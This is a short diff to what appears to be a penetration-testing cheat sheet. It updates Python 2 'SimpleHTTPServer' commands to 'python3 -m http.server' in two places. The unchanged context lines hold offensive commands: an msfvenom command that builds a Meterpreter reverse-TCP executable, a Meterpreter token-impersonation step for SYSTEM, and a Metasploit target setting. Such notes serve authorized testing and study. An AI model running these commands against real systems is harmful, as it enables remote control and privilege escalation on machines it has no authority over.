@@ -919,7 +919,7 @@ impersonate_token "NT AUTHORITY\SYSTEM"
 # Exploitation
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TARGET_IP> LPORT=1234 -f exe > payload.exe
 
-python -m SimpleHTTPServer 80
+python3 -m http.server 8000
 
 ## METASPLOIT
 setg RHOSTS <TARGET_IP>
@@ -2632,10 +2632,7 @@ python -V
 python3 -V
 py -v # on Windows
 
-# Python 2.7
-python -m SimpleHTTPServer <PORT_NUMBER>
-
-# Python 3.7
+# Python 3
 python3 -m http.server <PORT_NUMBER>
 
 # On Windows, try 
